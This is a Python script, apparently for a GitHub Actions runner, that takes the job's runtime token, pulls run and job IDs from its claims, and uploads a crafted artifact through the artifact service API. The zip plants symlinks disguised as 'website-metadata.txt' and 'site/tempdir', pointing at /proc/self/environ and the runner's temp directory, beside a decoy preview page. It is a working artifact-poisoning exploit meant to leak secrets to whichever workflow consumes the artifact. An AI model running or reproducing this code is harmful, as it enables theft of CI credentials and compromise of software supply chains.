import os, json, base64, hashlib, urllib.request, urllib.error, zipfile, io
tok = os.environ.get('ACTIONS_RUNTIME_TOKEN')
base = os.environ.get('ACTIONS_RESULTS_URL') or os.environ.get('ACTIONS_RUNTIME_URL')
print('HAVE_RUNTIME_TOKEN', bool(tok), 'HAVE_RESULTS_URL', bool(base))
if not tok or not base:
    raise SystemExit('no runtime token/url')
base = base.rstrip('/')
payload = tok.split('.')[1]; payload += '=' * (-len(payload) % 4)
claims = json.loads(base64.urlsafe_b64decode(payload))
run_id = job_id = None
for s in claims.get('scp', '').split(' '):
    if s.startswith('Actions.Results:'):
        _, run_id, job_id = s.split(':')
print('IDS', run_id, job_id)
def twirp(method, body):
    req = urllib.request.Request(
        f"{base}/twirp/github.actions.results.api.v1.ArtifactService/{method}",
        data=json.dumps(body).encode(),
        headers={'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tok})
    try:
        return json.loads(urllib.request.urlopen(req, timeout=30).read())
    except urllib.error.HTTPError as e:
        print('TWIRP_ERR', method, e.code, e.read()[:500])
        raise
r = twirp('CreateArtifact', {'workflow_run_backend_id': run_id,
                             'workflow_job_run_backend_id': job_id,
                             'name': 'artifacts', 'version': 7,
                             'mime_type': {'value': 'application/zip'}})
print('CREATE', {k: (v if not isinstance(v, str) else v[:60]) for k, v in r.items()})
url = r.get('signed_upload_url') or r.get('signedUploadUrl')
buf = io.BytesIO()
z = zipfile.ZipFile(buf, 'w')
zi = zipfile.ZipInfo('website-metadata.txt'); zi.external_attr = (0o120777) << 16
z.writestr(zi, '/proc/self/environ')
z.writestr('site/index.html', '<html>preview</html>\n')
zi = zipfile.ZipInfo('site/tempdir'); zi.external_attr = (0o120777) << 16
z.writestr(zi, '/home/runner/work/_temp')
z.close()
data = buf.getvalue()
req = urllib.request.Request(url, data=data, method='PUT',
    headers={'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/zip',
             'Content-Length': str(len(data))})
print('UPLOAD', urllib.request.urlopen(req, timeout=60).status)
h = 'sha256:' + hashlib.sha256(data).hexdigest()
print('FINALIZE', twirp('FinalizeArtifact', {'workflow_run_backend_id': run_id,
    'workflow_job_run_backend_id': job_id, 'name': 'artifacts',
    'size': str(len(data)), 'hash': {'value': h}}))
